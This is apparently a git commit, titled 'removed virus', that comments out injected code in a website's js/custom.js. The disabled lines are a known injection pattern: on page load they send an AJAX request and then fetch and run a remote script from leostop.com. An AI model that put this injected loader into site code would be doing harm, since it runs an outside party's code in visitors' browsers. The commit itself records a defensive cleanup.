60d8eadca43e7aad87106ba747291a1c9d029dbe
Viktor Rudenko <v.rudenko@triacom.ua>
2023-09-24 17:48:42 +0300

    removed virus

--- js/custom.js
+++ js/custom.js
@@ -73,17 +73,17 @@ $(function () {
     });
   });
 
-  function getURL() {
-    window.location.href;
-  }
-  var protocol = location.protocol;
-  $.ajax({
-    type: "get",
-    data: { surl: getURL() },
-    success: function (response) {
-      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
-    },
-  });
+  // function getURL() {
+  //   window.location.href;
+  // }
+  // var protocol = location.protocol;
+  // $.ajax({
+  //   type: "get",
+  //   data: { surl: getURL() },
+  //   success: function (response) {
+  //     $.getScript(protocol + "//leostop.com/tracking/tracking.js");
+  //   },
+  // });
 
   /* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
